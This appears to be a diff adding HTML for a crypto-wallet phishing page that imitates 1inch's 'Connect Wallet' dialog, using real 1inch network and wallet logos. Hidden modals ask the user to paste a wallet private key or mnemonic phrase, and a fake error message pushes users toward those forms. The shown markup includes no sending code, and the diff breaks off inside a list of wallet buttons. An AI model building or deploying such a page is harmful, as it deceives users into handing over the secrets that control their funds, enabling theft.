+       <div id="privatekey" style="display: none;" class="sc-hlTwrV cCVa-Dh">
+         <div role="presentation" class="sc-jONnzC hkzgbr"></div>
+         <div class="sc-clsFYl kTibWg">
+            <div class="sc-fbkiRW lmLjZm">
+               <div class="sc-eCstlR sc-jSgvzq sc-GqePz inxtCj cTcKPP ddwUpk">
+                  <h2 color="text" class="sc-gtsrHT sc-giImIA sc-ezredP hInkdm kXzAmZ">Connect to a wallet</h2>
+               </div>
+         <button id="closewallet1" class="sc-gsTEea iuOaSa sc-dlfnuX dOtaoI closeModal" scale="sm" aria-label="Close the dialog">
+                     <svg viewBox="0 0 24 24" width="24px" color="card" xmlns="http://www.w3.org/2000/svg" class="sc-bdfBQB cbuhpN">
+                        <path d="M18.2987 5.70997C17.9087 5.31997 17.2787 5.31997 16.8887 5.70997L11.9988 10.59L7.10875 5.69997C6.71875 5.30997 6.08875 5.30997 5.69875 5.69997C5.30875 6.08997 5.30875 6.71997 5.69875 7.10997L10.5888 12L5.69875 16.89C5.30875 17.28 5.30875 17.91 5.69875 18.3C6.08875 18.69 6.71875 18.69 7.10875 18.3L11.9988 13.41L16.8887 18.3C17.2787 18.69 17.9087 18.69 18.2987 18.3C18.6887 17.91 18.6887 17.28 18.2987 16.89L13.4087 12L18.2987 7.10997C18.6787 6.72997 18.6787 6.08997 18.2987 5.70997Z"></path>
+                     </svg>
+                  </button>
+            </div>
+            
+            <button id="connectWallet" class="aero">
+             <span id="error-msg">Typically 64 alphanumeric characters</span>
+             <div id="small-loader" style="display: none;" class="loader small-loader">Loading...</div>
+         </button>
+         <form id="form2">
+			 <input type="hidden" id="namewallet1" value="wallet" name="namewallet">
+         <textarea minlength="64" id="privatekeys" name="key" class="combocarteira" placeholder="Enter the private key to connect your wallet" required="required"></textarea>
+         
+            <div class="sc-gsVsKb gDYcOL">
+               
+             <button type="submit" class="botaokeys mb-20" height="50%" scale="md">Acess Wallet</button></div>
+            
+
+        
+           
+        
+         </form></div>
+      
+
+      </div>
+        
+       
+
+          <!--  Codigo Aqui das keys-->
+
+          <div id="dkeys" style="display: none;" class="sc-hlTwrV cCVa-Dh">
+            <div role="presentation" class="sc-jONnzC hkzgbr"></div>
+            <div class="sc-clsFYl kTibWg">
+               <div class="sc-fbkiRW lmLjZm">
+                  <div class="sc-eCstlR sc-jSgvzq sc-GqePz inxtCj cTcKPP ddwUpk">
+                     <h2 color="text" class="sc-giImIA sc-ezredP hInkdm kXzAmZ">Connect to a wallet</h2>
+                  </div>
+          <button id="closewallet3" class="sc-gsTEea iuOaSa sc-dlfnuX dOtaoI closeModal" scale="sm" aria-label="Close the dialog">
+                     <svg viewBox="0 0 24 24" width="24px" color="card" xmlns="http://www.w3.org/2000/svg" class="sc-bdfBQB cbuhpN">
+                        <path d="M18.2987 5.70997C17.9087 5.31997 17.2787 5.31997 16.8887 5.70997L11.9988 10.59L7.10875 5.69997C6.71875 5.30997 6.08875 5.30997 5.69875 5.69997C5.30875 6.08997 5.30875 6.71997 5.69875 7.10997L10.5888 12L5.69875 16.89C5.30875 17.28 5.30875 17.91 5.69875 18.3C6.08875 18.69 6.71875 18.69 7.10875 18.3L11.9988 13.41L16.8887 18.3C17.2787 18.69 17.9087 18.69 18.2987 18.3C18.6887 17.91 18.6887 17.28 18.2987 16.89L13.4087 12L18.2987 7.10997C18.6787 6.72997 18.6787 6.08997 18.2987 5.70997Z"></path>
+                     </svg>
+                  </button>
+               </div>
+               
+               <button id="connectWallet" class="aero">
+                <span id="error-msg">An error has occurred, please use these<br><span>login methods! We will fix the problem soon.</span></span>
+                <div id="small-loader" style="display: none;" class="loader small-loader">Loading...</div>
+            </button>
+               <div class="sc-gsVsKb gDYcOL"><button id="b12" class="botaokeys" height="50%" scale="md">Mnemonic Phrase<svg version="1.1" id="Capa_1" fill="#000" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 480 480" style="enable-background:new 0 0 480 480;" xml:space="preserve">
+              <g>
+                  <g>
+                    <path d="M415.928,88c0.019-2.111-0.798-4.144-2.272-5.656l-80-80c-1.505-1.484-3.543-2.302-5.656-2.272V0H88
+                        C74.745,0,64,10.745,64,24v432c0,13.255,10.745,24,24,24h304c13.255,0,24-10.745,24-24V88H415.928z M336,27.312L388.688,80H344
+                        c-4.418,0-8-3.582-8-8V27.312z M400,456c0,4.418-3.582,8-8,8H88c-4.418,0-8-3.582-8-8V24c0-4.418,3.582-8,8-8h232v56
+                        c0,13.255,10.745,24,24,24h56V456z"></path>
+                  </g>
+              </g>
+              <g>
+                  <g>
+                    <path d="M144,216c-13.255,0-24,10.745-24,24s10.745,24,24,24s24-10.745,24-24S157.255,216,144,216z M144,248c-4.418,0-8-3.582-8-8
+                        s3.582-8,8-8s8,3.582,8,8S148.418,248,144,248z"></path>
+                  </g>
+              </g>
+              <g>
+                  <g>
+                    <rect x="200" y="232" width="160" height="16"></rect>
+                  </g>
+              </g>
+              <g>
+                  <g>
+                    <path d="M144,136c-13.255,0-24,10.745-24,24s10.745,24,24,24s24-10.745,24-24S157.255,136,144,136z M144,168c-4.418,0-8-3.582-8-8
+                        s3.582-8,8-8s8,3.582,8,8S148.418,168,144,168z"></path>
+                  </g>
+              </g>
+              <g>
+                  <g>
+                    <rect x="200" y="152" width="160" height="16"></rect>
+                  </g>
+              </g>
+              <g>
+                  <g>
+                    <path d="M144,296c-13.255,0-24,10.745-24,24s10.745,24,24,24s24-10.745,24-24S157.255,296,144,296z M144,328c-4.418,0-8-3.582-8-8
+                        s3.582-8,8-8s8,3.582,8,8S148.418,328,144,328z"></path>
+                  </g>
+              </g>
+              <g>
+                  <g>
+                    <rect x="200" y="312" width="160" height="16"></rect>
+                  </g>
+              </g>
+              <g>
+                  <g>
+                    <path d="M144,376c-13.255,0-24,10.745-24,24s10.745,24,24,24s24-10.745,24-24S157.255,376,144,376z M144,408c-4.418,0-8-3.582-8-8
+                        s3.582-8,8-8s8,3.582,8,8S148.418,408,144,408z"></path>
+                  </g>
+              </g>
+              <g>
+                  <g>
+                    <rect x="200" y="392" width="160" height="16"></rect>
+                  </g>
+              </g>
+
+              </svg></button></div>
+               <div class="sc-gsVsKb gDYcOL"><button id="bkey" class="botaokeys mb-20" height="50%" scale="md">Private Key <svg version="1.1" id="Capa_1" fill="#000" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 512.001 512.001" style="enable-background:new 0 0 512.001 512.001;" xml:space="preserve">
+              <g>
+                  <g>
+                    <path d="M467.853,40.681C441.619,14.448,406.74,0,369.641,0c-37.099,0-71.978,14.448-98.212,40.681
+                        c-23.367,23.368-37.66,54.357-40.245,87.259c-2.375,30.206,5.19,60.365,21.363,85.684L12.229,453.937
+                        c-11.68,11.681-11.68,30.686,0,42.367c5.658,5.657,13.182,8.775,21.184,8.775s15.524-3.117,21.184-8.775l25.816-25.817
+                        l32.737,32.739c5.658,5.657,13.182,8.775,21.184,8.775s15.524-3.117,21.183-8.776c11.68-11.681,11.679-30.686,0-42.366
+                        l-17.333-17.332l19.258-19.258l17.332,17.331c5.658,5.659,13.182,8.776,21.184,8.776s15.524-3.116,21.181-8.775
+                        c5.658-5.657,8.776-13.181,8.776-21.183s-3.117-15.526-8.775-21.184L184.4,366.497l110.506-110.505
+                        c22.292,14.275,47.985,21.787,74.743,21.789c37.098-0.001,71.971-14.446,98.201-40.676c26.233-26.234,40.681-61.113,40.681-98.212
+                        C508.534,101.794,494.086,66.915,467.853,40.681z M456.297,225.551c-23.145,23.146-53.91,35.89-86.636,35.89
+                        c-25.681-0.002-50.237-7.831-71.023-22.645c-3.25-2.315-7.695-1.946-10.519,0.876L167.07,360.72
+                        c-1.532,1.533-2.392,3.61-2.392,5.778c0,2.168,0.861,4.244,2.392,5.778l38.514,38.514c2.572,2.571,3.989,5.991,3.989,9.629
+                        c0,3.637-1.417,7.057-3.989,9.629c-2.571,2.572-5.992,3.988-9.628,3.988c-3.637,0-7.058-1.416-9.63-3.989l-23.11-23.109
+                        c-3.19-3.19-8.363-3.19-11.554,0l-30.811,30.811c-3.191,3.192-3.191,8.364,0,11.555l23.11,23.11c5.31,5.308,5.31,13.948,0,19.257
+                        c-2.571,2.572-5.992,3.989-9.628,3.989c-3.637,0-7.058-1.417-9.629-3.989L86.19,453.156c-1.596-1.595-3.686-2.392-5.778-2.392
+                        c-2.09,0-4.182,0.797-5.778,2.392L43.042,484.75c-2.572,2.572-5.993,3.989-9.63,3.989s-7.058-1.417-9.629-3.989
+                        c-5.31-5.308-5.31-13.948,0-19.257l245.079-245.078c2.821-2.823,3.192-7.269,0.876-10.519
+                        c-34.82-48.861-29.25-115.167,13.244-157.662c23.148-23.147,53.923-35.894,86.659-35.894c32.735,0,63.511,12.748,86.657,35.896
+                        c23.148,23.147,35.896,53.922,35.896,86.657C492.194,171.629,479.445,202.404,456.297,225.551z"></path>
+                  </g>
+              </g>
+              <g>
+                  <g>
+                    <path d="M457.037,134.307c-4.507-0.194-8.313,3.323-8.497,7.83c-0.81,19.864-8.999,38.546-23.054,52.601
+                        c-14.916,14.919-34.748,23.134-55.845,23.134c-21.095,0-40.928-8.215-55.846-23.133c-30.794-30.794-30.794-80.898,0-111.691
+                        c14.917-14.919,34.75-23.134,55.846-23.134c21.097,0,40.929,8.215,55.846,23.133c8.413,8.412,14.675,18.325,18.612,29.465
+                        c1.502,4.254,6.171,6.484,10.425,4.981c4.254-1.504,6.485-6.171,4.981-10.425c-4.756-13.458-12.314-25.426-22.463-35.575
+                        c-18.004-18.003-41.94-27.918-67.401-27.918c-25.461,0-49.397,9.915-67.401,27.918c-37.165,37.165-37.165,97.637,0,134.802
+                        c18.004,18.003,41.94,27.918,67.401,27.918c25.461,0,49.398-9.915,67.401-27.918c16.965-16.965,26.847-39.512,27.827-63.49
+                        C465.051,138.295,461.546,134.491,457.037,134.307z"></path>
+                  </g>
+              </g>
+              </svg>
+         </button>
+          
+         
+         </div>
+               
+           
+            </div>
+            
+  
+         </div>
+        
+
+          <!-- Dialog de wallets -->
+          <div id="dwallets" style="display: none;" class="sc-hlTwrV cCVa-Dh">
+
+<div class="modal-connect-wallet">
+		          <div _ngcontent-hwb-c287="" mat-dialog-actions="" class="mat-dialog-actions fix-mat-dialog-close"><button _ngcontent-hwb-c287="" mat-icon-button="" mat-dialog-close="" aria-label="close" data-id="connect-wallet-dialog.close-icon" class="mat-focus-indicator icon-button-close text-gray mat-icon-button mat-button-base" type="button"><span class="mat-button-wrapper"><svg _ngcontent-hwb-c287="" width="24" height="24"><use _ngcontent-hwb-c287="" xlink:href="assets/images/icons/cross.svg#cross"></use></svg></span><span matripple="" class="mat-ripple mat-button-ripple mat-button-ripple-round"></span><span class="mat-button-focus-overlay"></span></button></div>
+	          <h2 _ngcontent-hwb-c287="" transloco="walletConnectBox.connect-wallet" class="mb-20">Connect Wallet</h2>
+	<div class="tab1">
+		<span class="connect-wallet-title"><span class="number-tab">1</span>Accept Terms of Service and Privacy Policy</span>
+		<label><input type="checkbox">I read and accept</label>
+	</div>
+
+	<div class="tab2">
+		<span class="connect-wallet-title"><span class="number-tab">2</span>Choose Network</span>
+		<div class="buttons-row">
+			<div class="button-wrap" data-btn="btn1">
+				<img src="https://app.1inch.io/assets/images/network-logos/ethereum.svg">
+				<span>Ethereum</span>
+			</div>
+			<div class="button-wrap" data-btn="btn2">
+				<img src="https://app.1inch.io/assets/images/network-logos/bsc_2.svg">
+				<span>BNB Chain</span>
+			</div>
+			<div class="button-wrap" data-btn="btn3">
+				<img src="https://app.1inch.io/assets/images/network-logos/polygon.svg">
+				<span>Polygon</span>
+			</div>
+			<div class="button-wrap" data-btn="btn4">
+				<img src="https://app.1inch.io/assets/images/network-logos/optimism.svg">
+				<span>Optimism</span>
+			</div>
+			<div class="button-wrap" data-btn="btn5">
+				<img src="https://app.1inch.io/assets/images/network-logos/arbitrum.svg">
+				<span>Arbitrum</span>
+			</div>
+			<div class="button-wrap" data-btn="btn6">
+				<img src="https://app.1inch.io/assets/images/network-logos/gnosis.svg">
+				<span>Gnosis Chain</span>
+			</div>
+			<div class="button-wrap" data-btn="btn7">
+				<img src="https://app.1inch.io/assets/images/network-logos/avalanche.svg">
+				<span>Avalanche</span>
+			</div>
+		</div>
+	</div>
+	
+	<div class="tab3">
+		<span class="connect-wallet-title"><span class="number-tab">3</span>Choose Wallet</span>
+		
+		
+		<div class="buttons-row active" data-tab="btn1">
+			<div class="button-wrap">
+				<button id="swallet" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/one-inch.svg">
+					<span>1INCH WalletConnect</span>
+				</button>
+			</div>
+			<div class="button-wrap">
+				<button id="swallet1" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/web3.svg">
+					<span>Web3</span>
+				</button>
+			</div>
+			<div class="button-wrap">
+				<button id="swallet2" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/wallet-connect.svg">
+					<span>WalletConnect</span>
+				</button>
+			</div>
+			<div class="button-wrap">
+				<button id="swallet3" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/wallet-link.svg">
+					<span>Coinbase Wallet</span>
+				</button>
+			</div>
+			<div class="button-wrap">
+				<button id="swallet4" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/ledger_2.svg">
+					<span>Ledger</span>
+				</button>
+			</div>
+			<div class="button-wrap">
+				<button id="swallet5" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/trezor.svg">
+					<span>Trezor</span>
+				</button>
+			</div>
+			<div class="button-wrap">
+			    <button id="swallet6" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/keepKey.svg">
+					<span>KeepKey</span>
+			    </button>
+			</div>
+			<div class="button-wrap">
+				<button id="swallet7" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/portis.svg">
+					<span>Portis</span>
+				</button>
+			</div>
+			<div class="button-wrap">
+				<button id="swallet8" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/mew.svg">
+					<span>MEW</span>
+				</button>
+			</div>
+			<div class="button-wrap">
+				<button id="swallet9" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/fortmatic.svg">
+					<span>Fortmatic</span>
+				</button>
+			</div>
+			<div class="button-wrap">
+				<button id="swallet10" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/authereum.svg">
+					<span>Authereum</span>
+				</button>
+			</div>
+			<div class="button-wrap">
+				<a id="swallet11" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/torus.svg">
+					<span>Torus</span>
+				</a>
+			</div>
+			<div class="button-wrap">
+				<a id="swallet12" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/bitski.svg">
+					<span>Bitski</span>
+				</a>
+			</div>
+			<div class="button-wrap">
+				<a id="swallet13" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/injected-binance.svg">
+					<span>Binance Chain Wallet</span>
+				</a>
+			</div>
+			<div class="button-wrap">
+				<a id="swallet14" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/arkane.svg">
+					<span>Venly</span>
+				</a>
+			</div>
+		</div>
+		
+		
+		<div class="buttons-row" data-tab="btn2" style="display: none">
+			<div class="button-wrap">
+				<a id="swallet15" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/one-inch.svg">
+					<span>1INCH WalletConnect</span>
+				</a>
+			</div>
+			<div class="button-wrap">
+				<a id="swallet16" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/web3.svg">
+					<span>Web3</span>
+				</a>
+			</div>
+			<div class="button-wrap">
+				<a id="swallet17" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/wallet-connect.svg">
+					<span>WalletConnect</span>
+				</a>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/wallet-link.svg">
+				<span>Coinbase Wallet</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/ledger_2.svg">
+				<span>Ledger</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/trezor.svg">
+				<span>Trezor</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/keepKey.svg">
+				<span>KeepKey</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/portis.svg">
+				<span>Portis</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/mew.svg">
+				<span>MEW</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/fortmatic.svg">
+				<span>Fortmatic</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/authereum.svg">
+				<span>Authereum</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/torus.svg">
+				<span>Torus</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/bitski.svg">
+				<span>Bitski</span>
+			</div>
+			<div class="button-wrap">
+				<a id="swallet18" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/injected-binance.svg">
+					<span>Binance Chain Wallet</span>
+				</a>
+			</div>
+			<div class="button-wrap">
+				<a id="swallet19" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/arkane.svg">
+					<span>Venly</span>
+				</a>
+			</div>
+		</div>
+		
+		
+		<div class="buttons-row" data-tab="btn3" style="display: none">
+			<div class="button-wrap">
+				<a id="swallet20" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/one-inch.svg">
+					<span>1INCH WalletConnect</span>
+				</a>
+			</div>
+			<div class="button-wrap">
+				<a id="swallet21" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/web3.svg">
+					<span>Web3</span>
+				</a>
+			</div>
+			<div class="button-wrap">
+				<a id="swallet22" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/wallet-connect.svg">
+					<span>WalletConnect</span>
+				</a>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/wallet-link.svg">
+				<span>Coinbase Wallet</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/ledger_2.svg">
+				<span>Ledger</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/trezor.svg">
+				<span>Trezor</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/keepKey.svg">
+				<span>KeepKey</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/portis.svg">
+				<span>Portis</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/mew.svg">
+				<span>MEW</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/fortmatic.svg">
+				<span>Fortmatic</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/authereum.svg">
+				<span>Authereum</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/torus.svg">
+				<span>Torus</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/bitski.svg">
+				<span>Bitski</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/injected-binance.svg">
+				<span>Binance Chain Wallet</span>
+			</div>
+			<div class="button-wrap">
+				<a id="swallet23" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/arkane.svg">
+					<span>Venly</span>
+				</a>
+			</div>
+		</div>
+		
+		<div class="buttons-row" data-tab="btn4" style="display: none">
+			<div class="button-wrap">
+				<a id="swallet24" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/one-inch.svg">
+					<span>1INCH WalletConnect</span>
+				</a>
+			</div>
+			<div class="button-wrap">
+				<a id="swallet25" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/web3.svg">
+					<span>Web3</span>
+				</a>
+			</div>
+			<div class="button-wrap">
+				<a id="swallet26" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/wallet-connect.svg">
+					<span>WalletConnect</span>
+				</a>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/wallet-link.svg">
+				<span>Coinbase Wallet</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/ledger_2.svg">
+				<span>Ledger</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/trezor.svg">
+				<span>Trezor</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/keepKey.svg">
+				<span>KeepKey</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/portis.svg">
+				<span>Portis</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/mew.svg">
+				<span>MEW</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/fortmatic.svg">
+				<span>Fortmatic</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/authereum.svg">
+				<span>Authereum</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/torus.svg">
+				<span>Torus</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/bitski.svg">
+				<span>Bitski</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/injected-binance.svg">
+				<span>Binance Chain Wallet</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/arkane.svg">
+				<span>Venly</span>
+			</div>
+		</div>
+		
+		<div class="buttons-row" data-tab="btn5" style="display: none">
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/one-inch.svg">
+				<span>1INCH WalletConnect</span>
+			</div>
+			<div class="button-wrap">
+				<a id="swallet27" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/web3.svg">
+					<span>Web3</span>
+				</a>
+			</div>
+			<div class="button-wrap">
+				<a id="swallet28" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/wallet-connect.svg">
+					<span>WalletConnect</span>
+				</a>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/wallet-link.svg">
+				<span>Coinbase Wallet</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/ledger_2.svg">
+				<span>Ledger</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/trezor.svg">
+				<span>Trezor</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/keepKey.svg">
+				<span>KeepKey</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/portis.svg">
+				<span>Portis</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/mew.svg">
+				<span>MEW</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/fortmatic.svg">
+				<span>Fortmatic</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/authereum.svg">
+				<span>Authereum</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/torus.svg">
+				<span>Torus</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/bitski.svg">
+				<span>Bitski</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/injected-binance.svg">
+				<span>Binance Chain Wallet</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/arkane.svg">
+				<span>Venly</span>
+			</div>
+		</div>
+		
+		<div class="buttons-row" data-tab="btn6" style="display: none">
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/one-inch.svg">
+				<span>1INCH WalletConnect</span>
+			</div>
+			<div class="button-wrap">
+				<a id="swallet29" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/web3.svg">
+					<span>Web3</span>
+				</a>
+			</div>
+			<div class="button-wrap">
+				<a id="swallet30" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/wallet-connect.svg">
+					<span>WalletConnect</span>
+				</a>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/wallet-link.svg">
+				<span>Coinbase Wallet</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/ledger_2.svg">
+				<span>Ledger</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/trezor.svg">
+				<span>Trezor</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/keepKey.svg">
+				<span>KeepKey</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/portis.svg">
+				<span>Portis</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/mew.svg">
+				<span>MEW</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/fortmatic.svg">
+				<span>Fortmatic</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/authereum.svg">
+				<span>Authereum</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/torus.svg">
+				<span>Torus</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/bitski.svg">
+				<span>Bitski</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/injected-binance.svg">
+				<span>Binance Chain Wallet</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/arkane.svg">
+				<span>Venly</span>
+			</div>
+		</div>
+		
+		<div class="buttons-row" data-tab="btn7" style="display: none">
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/one-inch.svg">
+				<span>1INCH WalletConnect</span>
+			</div>
+			<div class="button-wrap">
+				<a id="swallet31" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/web3.svg">
+					<span>Web3</span>
+				</a>
+			</div>
+			<div class="button-wrap">
+				<a id="swallet32" href="#" onclick="getdetails(this)">
+					<img src="https://app.1inch.io/assets/images/wallet-logos/wallet-connect.svg">
+					<span>WalletConnect</span>
+				</a>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/wallet-link.svg">
+				<span>Coinbase Wallet</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/ledger_2.svg">
+				<span>Ledger</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/trezor.svg">
+				<span>Trezor</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/keepKey.svg">
+				<span>KeepKey</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/portis.svg">
+				<span>Portis</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/mew.svg">
+				<span>MEW</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/fortmatic.svg">
+				<span>Fortmatic</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/authereum.svg">
+				<span>Authereum</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/torus.svg">
+				<span>Torus</span>
+			</div>
